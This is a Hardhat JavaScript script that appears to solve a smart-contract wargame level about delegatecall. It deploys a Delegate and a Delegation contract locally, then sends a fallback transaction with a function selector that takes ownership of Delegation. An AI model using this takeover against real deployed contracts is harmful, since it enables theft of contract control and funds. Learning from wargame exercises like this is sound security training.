const { ethers } = require("hardhat");

const DELEGATE_CONTRACT_NAME = "Delegate";
const DELEGATION_CONTRACT_NAME = "Delegation";
// const DELEGATE_CONTRACT_ADDRESS = "0x21382a299DC5B41AE126a45539570daceF8c5baC";
// const DELEGATION_CONTRACT_ADDRESS = "0xBeD07932671444ac6ed4a91F180e324aebB489ca";

async function main() {

    const [attacker] = await ethers.getSigners();

    // Part 1
    const delegateFactory = await ethers.getContractFactory(DELEGATE_CONTRACT_NAME);
    // const delegateContract = delegateFactory.attach(DELEGATE_CONTRACT_ADDRESS);

    console.log("Deploying Delegate Contract");
    const delegateContract = await delegateFactory.deploy("0x73379d8B82Fda494ee59555f333DF7D44483fD58");
    await delegateContract.waitForDeployment();

    const DELEGATE_CONTRACT_ADDRESS = await delegateContract.getAddress();
    console.log("Delegate Contract deployed at: ", await delegateContract.getAddress());

    console.log("Current Owner of Delegate is: ", await delegateContract.owner());

    // Part 2
    const delegationFactory = await ethers.getContractFactory(DELEGATION_CONTRACT_NAME);
    // const delegationContract = delegationFactory.attach(DELEGATION_CONTRACT_ADDRESS);

    console.log("Deploying Delegation Contract");
    const delegationContract = await delegationFactory.deploy(DELEGATE_CONTRACT_ADDRESS);
    await delegateContract.waitForDeployment();

    console.log("Delegation Factory deployed at: ", await delegationContract.getAddress());
    console.log("Current Owner of Delegation is: ", await delegationContract.owner());

    // Take ownership of the contract
    const tx = await attacker.sendTransaction({
        to: await delegationContract.getAddress(),
        data: "0xdd365b8b",
    });
    await tx.wait();

    console.log("Ownership transaction hash: ", tx.hash);
    console.log("Current Owner of Delegation After Fallback Call is: ", await delegationContract.owner());
}

main().catch((error) => {
    console.error(error)
    process.exitCode = 1
})
